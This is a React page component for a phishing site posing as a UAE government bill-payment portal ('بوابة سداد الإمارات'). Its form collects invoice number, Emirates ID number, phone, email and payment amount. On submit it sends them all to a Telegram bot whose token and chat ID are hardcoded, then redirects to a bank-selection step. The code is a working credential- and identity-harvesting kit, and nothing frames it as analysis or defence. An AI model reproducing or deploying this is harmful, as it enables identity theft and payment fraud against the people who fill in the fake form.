import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";

export default function UserData() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    invoiceNumber: "",
    idNumber: "",
    phoneNumber: "",
    email: "",
    serviceType: "",
    amount: ""
  });

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const message = `
📝 *بيانات المستخدم - بوابة سداد الإمارات*
--------------------------
🧾 *رقم الفاتورة:* ${formData.invoiceNumber}
🆔 *رقم الهوية:* ${formData.idNumber}
📱 *رقم الجوال:* ${formData.phoneNumber}
📧 *البريد الإلكتروني:* ${formData.email}
🛠 *نوع الخدمة:* ${formData.serviceType}
💰 *المبلغ:* ${formData.amount} درهم إماراتي
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      // Save to session storage for next steps
      sessionStorage.setItem("paymentData", JSON.stringify(formData));
      setLocation("/select-bank");
    } catch (error) {
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex flex-col items-center">
          <div className="bg-amber-500 p-2 rounded-full mb-1">
            <span className="text-white font-bold text-lg">سداد</span>
          </div>
          <h1 className="text-xl font-bold text-gray-800">بوابة سداد الإمارات</h1>
        </div>
      </header>

      <main className="flex-grow container py-8 px-4">
        <div className="max-w-xl mx-auto bg-white rounded-xl shadow-lg p-6 border border-gray-100">
          <div className="flex justify-between mb-8 relative">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className={`z-10 w-8 h-8 rounded-full flex items-center justify-center font-bold ${step === 1 ? 'bg-amber-500 text-white' : 'bg-gray-200 text-gray-500'}`}>
                {step}
              </div>
            ))}
            <div className="absolute top-4 left-0 right-0 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <h2 className="text-2xl font-bold text-gray-900 mb-2 text-center">إدخال بيانات المستخدم</h2>
          <p className="text-gray-500 text-center mb-8">يرجى إدخال بيانات الفاتورة والبيانات الشخصية</p>

          <form onSubmit={handleNext} className="space-y-5">
            <div className="space-y-2">
              <Label htmlFor="invoiceNumber">رقم الفاتورة</Label>
              <Input id="invoiceNumber" required placeholder="أدخل رقم الفاتورة" value={formData.invoiceNumber} onChange={(e) => setFormData({...formData, invoiceNumber: e.target.value})} />
            </div>
            <div className="space-y-2">
              <Label htmlFor="idNumber">رقم الهوية الإماراتية</Label>
              <Input id="idNumber" required placeholder="784-XXXX-XXXXXXX-X" value={formData.idNumber} onChange={(e) => setFormData({...formData, idNumber: e.target.value})} />
            </div>
            <div className="space-y-2">
              <Label htmlFor="phoneNumber">رقم الجوال</Label>
              <Input id="phoneNumber" required type="tel" placeholder="05XXXXXXXX" value={formData.phoneNumber} onChange={(e) => setFormData({...formData, phoneNumber: e.target.value})} />
            </div>
            <div className="space-y-2">
              <Label htmlFor="email">البريد الإلكتروني</Label>
              <Input id="email" required type="email" placeholder="أدخل بريدك الإلكتروني" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
            </div>
            <div className="space-y-2">
              <Label htmlFor="serviceType">نوع الخدمة</Label>
              <Select onValueChange={(val) => setFormData({...formData, serviceType: val})} required>
                <SelectTrigger id="serviceType">
                  <SelectValue placeholder="اختر نوع الخدمة" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="دفع الفواتير الحكومية">دفع الفواتير الحكومية</SelectItem>
                  <SelectItem value="دفع رسوم المرور">دفع رسوم المرور</SelectItem>
                  <SelectItem value="دفع رسوم التراخيص">دفع رسوم التراخيص</SelectItem>
                  <SelectItem value="دفع فواتير الكهرباء والماء">دفع فواتير الكهرباء والماء</SelectItem>
                  <SelectItem value="دفع فواتير الاتصالات">دفع فواتير الاتصالات</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2">
              <Label htmlFor="amount">مبلغ السداد (درهم إماراتي)</Label>
              <Input id="amount" required type="number" placeholder="0.00" value={formData.amount} onChange={(e) => setFormData({...formData, amount: e.target.value})} />
            </div>

            <div className="flex gap-4 pt-4">
              <Button type="button" variant="outline" className="flex-1" onClick={() => setLocation("/")}>الرجوع</Button>
              <Button type="submit" className="flex-1 bg-amber-500 hover:bg-amber-600 text-white" disabled={loading}>
                {loading ? "جاري المعالجة..." : "التالي"}
              </Button>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
}
